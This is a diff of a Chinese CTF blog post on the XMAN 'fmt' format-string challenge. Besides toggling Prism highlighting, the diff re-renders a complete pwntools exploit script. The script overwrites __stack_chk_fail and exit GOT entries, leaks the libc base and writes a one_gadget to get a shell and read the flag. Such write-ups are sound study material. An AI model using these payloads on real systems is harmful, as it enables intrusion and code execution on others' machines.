@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="xman结营赛 fmt​    一个在xman的朋友扔了个fmt给我，然而我之前没有深入了解过格式化字符串，所以趁这次了解了一下。">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -324,122 +324,9 @@
 <p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如<code>%i$s</code>表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
 <p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如<code>%100×10$n</code>表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而<code>%$hn</code>表示写入的地址空间为2字节，<code>%$hhn</code>表示写入的地址空间为1字节，<code>%$lln</code>表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过<code>%$hn</code>或<code>%$hhn</code>来适时调整。</p>
 <p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。<br>    了解了原理之后再来做题发现就简单了。<br>    这道题的难点在于他没有循环，没有循环就造成一个问题，你最多只能泄露一次或者改写一次数据，而如果只能进行一次操作，那就很难getshell。所以直接一次去改写某个数据很难进行更深的操作，这里必须要有一个循环，聪明的我很快就注意到了（捂脸捂脸），程序开启了canary，而且可以进行溢出，一开始我想的是否能直接leak canary，但是这和之前一样没有循环，然后注意到stack_check_fail函数，想到了可以通过劫持stack_check_fail函数跳到程序开头重新执行，如果每次都进行溢出，那么就能构造一个循环。然后就是leak libc基地址，查找libc库，最后写one_gadget到exit函数。<br>    基本思路确定了，接下来写exp时遇到不少问题，最多的就是输入输出流的接收一直没有搞好，导致输入一直阻塞，但是最终还是把exp写出来了。本地没有成功，但是确定能执行gadget，等以后再填坑吧，基本思路应该是没有错的。</p>
-<pre><code>from sys import argv
-from pwn import *
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">"linux"</span>, arch=<span class="string">"amd64"</span>)</span><br><span class="line"><span class="meta"># context.log_level = "debug"</span></span><br><span class="line"><span class="meta"># r = process("./once_time", aslr=0)</span></span><br><span class="line">r = remote(argv[<span class="number">1</span>], <span class="number">20004</span>)</span><br><span class="line">e = ELF(<span class="string">"./once_time"</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">def sl(s):</span><br><span class="line">	r.sendline(s)</span><br><span class="line"></span><br><span class="line">def sd(s):</span><br><span class="line">	r.send(s)</span><br><span class="line"></span><br><span class="line">def rc(timeout=<span class="number">0</span>):</span><br><span class="line">	<span class="keyword">if</span> timeout == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> r.recv()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> r.recv(timeout=timeout)</span><br><span class="line"></span><br><span class="line">def ru(s, timeout=<span class="number">0</span>):</span><br><span class="line">	<span class="keyword">if</span> timeout == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> r.recvuntil(s)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> r.recvuntil(s, timeout=timeout)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400983</span></span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line">sl(p64(e.got[<span class="string">"__stack_chk_fail"</span>]))</span><br><span class="line">rc()</span><br><span class="line">payload = <span class="string">'%'</span>+str(start)+<span class="string">"d%12$n"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">"\x00"</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">ru(<span class="string">"input your name: "</span>)</span><br><span class="line">sl(p64(e.got[<span class="string">"read"</span>]))</span><br><span class="line">ru(<span class="string">"leave a msg: "</span>)</span><br><span class="line"><span class="meta"># gdb.attach(r, "b *0x400968")</span></span><br><span class="line"><span class="meta"># # raw_input()</span></span><br><span class="line">payload = <span class="string">"%12$s"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">"\x00"</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">libc.address = <span class="keyword">int</span>(rc()[:<span class="number">6</span>][::<span class="number">-1</span>].encode(<span class="string">"hex"</span>), <span class="number">16</span>) - libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">log.info(<span class="string">"libc &gt; "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="meta"># gdb.attach(r, "b *0x400968")</span></span><br><span class="line"><span class="meta"># # raw_input()</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span> + libc.address</span><br><span class="line">log.info(<span class="string">"one_gadget &gt; "</span> + hex(one_gadget))</span><br><span class="line">sl(p64(e.got[<span class="string">"exit"</span>]))</span><br><span class="line">ru(<span class="string">"leave a msg: "</span>)</span><br><span class="line"><span class="meta"># gdb.attach(r, "b *0x400968")</span></span><br><span class="line"><span class="meta"># # raw_input()</span></span><br><span class="line">payload = <span class="string">"%"</span> + str(one_gadget &amp; <span class="number">0xFFFF</span>) + <span class="string">"d%12$hn"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">"\x00"</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"><span class="meta"># raw_input()</span></span><br><span class="line">ru(<span class="string">"input your name: "</span>)</span><br><span class="line"><span class="meta"># raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># gdb.attach(r, "b *0x400968")</span></span><br><span class="line"><span class="meta"># # raw_input()</span></span><br><span class="line">sl(p64(e.got[<span class="string">"exit"</span>]+<span class="number">2</span>))</span><br><span class="line">ru(<span class="string">"leave a msg: "</span>)</span><br><span class="line"><span class="meta"># gdb.attach(r, "b *0x400968")</span></span><br><span class="line"><span class="meta"># # raw_input()</span></span><br><span class="line">payload = <span class="string">"%"</span> + str((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>) + <span class="string">"d%12$hn"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">"\x00"</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"><span class="meta"># raw_input()</span></span><br><span class="line">ru(<span class="string">"input your name: "</span>)</span><br><span class="line"><span class="meta"># raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># gdb.attach(r, "b *0x400968")</span></span><br><span class="line"><span class="meta"># # raw_input()</span></span><br><span class="line">sl(p64(e.got[<span class="string">"exit"</span>]+<span class="number">4</span>))</span><br><span class="line">ru(<span class="string">"leave a msg: "</span>)</span><br><span class="line"><span class="meta"># gdb.attach(r, "b *0x400968")</span></span><br><span class="line"><span class="meta"># # raw_input()</span></span><br><span class="line">payload = <span class="string">"%"</span> + str((one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>) + <span class="string">"d%12$hn"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">"\x00"</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"><span class="meta"># raw_input()</span></span><br><span class="line">ru(<span class="string">"input your name: "</span>)</span><br><span class="line"><span class="meta"># raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># gdb.attach(r, "b *0x400968")</span></span><br><span class="line"><span class="meta"># # raw_input()</span></span><br><span class="line">sl(p64(e.got[<span class="string">"exit"</span>]+<span class="number">6</span>))</span><br><span class="line">ru(<span class="string">"leave a msg: "</span>)</span><br><span class="line">log.info(<span class="string">"one_gadget &gt; "</span> + hex(one_gadget))</span><br><span class="line"><span class="meta"># gdb.attach(r, """b *0x40094D</span></span><br><span class="line"><span class="meta"># b *0x400968""")</span></span><br><span class="line"><span class="meta"># raw_input()</span></span><br><span class="line">log.info(<span class="string">"one_gadget &gt; "</span> + hex((one_gadget &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line"><span class="keyword">if</span> (one_gadget &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xFFFF</span> != <span class="number">0</span>:</span><br><span class="line">	payload = <span class="string">"%"</span> + str((one_gadget &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xFFFF</span>) + <span class="string">"d%12$hn"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	payload = <span class="string">"%12$hn"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">"\x00"</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"><span class="meta"># raw_input()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input your name: "</span>)</span><br><span class="line">sl(<span class="string">'a'</span>)</span><br><span class="line">ru(<span class="string">"leave a msg: "</span>)</span><br><span class="line">sl(<span class="string">"%p"</span>)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./flags"</span>, <span class="string">"a"</span>)</span><br><span class="line">sl(<span class="string">'cat flag'</span>)</span><br><span class="line">flag = rc(timeout=<span class="number">1</span>).rstrip(<span class="string">"\n"</span>)</span><br><span class="line">log.info(<span class="string">"flag &gt; "</span> + flag)</span><br><span class="line">f.write(flag+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
 
-context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)
-# context.log_level = &quot;debug&quot;
-# r = process(&quot;./once_time&quot;, aslr=0)
-r = remote(argv[1], 20004)
-e = ELF(&quot;./once_time&quot;)
-libc = e.libc
 
-def sl(s):
-    r.sendline(s)
-
-def sd(s):
-    r.send(s)
-
-def rc(timeout=0):
-    if timeout == 0:
-        return r.recv()
-    else:
-        return r.recv(timeout=timeout)
-
-def ru(s, timeout=0):
-    if timeout == 0:
-        return r.recvuntil(s)
-    else:
-        return r.recvuntil(s, timeout=timeout)
-
-start = 0x400983
-
-rc()
-sl(p64(e.got[&quot;__stack_chk_fail&quot;]))
-rc()
-payload = &#39;%&#39;+str(start)+&quot;d%12$n&quot;
-payload = payload.ljust(0x20, &quot;\x00&quot;)
-sd(payload)
-ru(&quot;input your name: &quot;)
-sl(p64(e.got[&quot;read&quot;]))
-ru(&quot;leave a msg: &quot;)
-# gdb.attach(r, &quot;b *0x400968&quot;)
-# # raw_input()
-payload = &quot;%12$s&quot;
-payload = payload.ljust(0x20, &quot;\x00&quot;)
-sd(payload)
-libc.address = int(rc()[:6][::-1].encode(&quot;hex&quot;), 16) - libc.symbols[&quot;read&quot;]
-log.info(&quot;libc &gt; &quot; + hex(libc.address))
-
-# gdb.attach(r, &quot;b *0x400968&quot;)
-# # raw_input()
-one_gadget = 0xf1147 + libc.address
-log.info(&quot;one_gadget &gt; &quot; + hex(one_gadget))
-sl(p64(e.got[&quot;exit&quot;]))
-ru(&quot;leave a msg: &quot;)
-# gdb.attach(r, &quot;b *0x400968&quot;)
-# # raw_input()
-payload = &quot;%&quot; + str(one_gadget &amp; 0xFFFF) + &quot;d%12$hn&quot;
-payload = payload.ljust(0x20, &quot;\x00&quot;)
-sd(payload)
-# raw_input()
-ru(&quot;input your name: &quot;)
-# raw_input()
-
-# gdb.attach(r, &quot;b *0x400968&quot;)
-# # raw_input()
-sl(p64(e.got[&quot;exit&quot;]+2))
-ru(&quot;leave a msg: &quot;)
-# gdb.attach(r, &quot;b *0x400968&quot;)
-# # raw_input()
-payload = &quot;%&quot; + str((one_gadget &gt;&gt; 16) &amp; 0xFFFF) + &quot;d%12$hn&quot;
-payload = payload.ljust(0x20, &quot;\x00&quot;)
-sd(payload)
-# raw_input()
-ru(&quot;input your name: &quot;)
-# raw_input()
-
-# gdb.attach(r, &quot;b *0x400968&quot;)
-# # raw_input()
-sl(p64(e.got[&quot;exit&quot;]+4))
-ru(&quot;leave a msg: &quot;)
-# gdb.attach(r, &quot;b *0x400968&quot;)
-# # raw_input()
-payload = &quot;%&quot; + str((one_gadget &gt;&gt; 32) &amp; 0xFFFF) + &quot;d%12$hn&quot;
-payload = payload.ljust(0x20, &quot;\x00&quot;)
-sd(payload)
-# raw_input()
-ru(&quot;input your name: &quot;)
-# raw_input()
-
-# gdb.attach(r, &quot;b *0x400968&quot;)
-# # raw_input()
-sl(p64(e.got[&quot;exit&quot;]+6))
-ru(&quot;leave a msg: &quot;)
-log.info(&quot;one_gadget &gt; &quot; + hex(one_gadget))
-# gdb.attach(r, &quot;&quot;&quot;b *0x40094D
-# b *0x400968&quot;&quot;&quot;)
-# raw_input()
-log.info(&quot;one_gadget &gt; &quot; + hex((one_gadget &gt;&gt; 48) &amp; 0xFFFF))
-if (one_gadget &gt;&gt; 48) &amp; 0xFFFF != 0:
-    payload = &quot;%&quot; + str((one_gadget &gt;&gt; 48) &amp; 0xFFFF) + &quot;d%12$hn&quot;
-else:
-    payload = &quot;%12$hn&quot;
-payload = payload.ljust(0x20, &quot;\x00&quot;)
-sd(payload)
-# raw_input()
-
-ru(&quot;input your name: &quot;)
-sl(&#39;a&#39;)
-ru(&quot;leave a msg: &quot;)
-sl(&quot;%p&quot;)
-ru(&#39;\n&#39;)
-
-f = open(&quot;./flags&quot;, &quot;a&quot;)
-sl(&#39;cat flag&#39;)
-flag = rc(timeout=1).rstrip(&quot;\n&quot;)
-log.info(&quot;flag &gt; &quot; + flag)
-f.write(flag+&#39;\n&#39;)</code></pre>
     </div>
 
     
@@ -544,8 +431,6 @@ f.write(flag+&#39;\n&#39;)</code></pre>
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
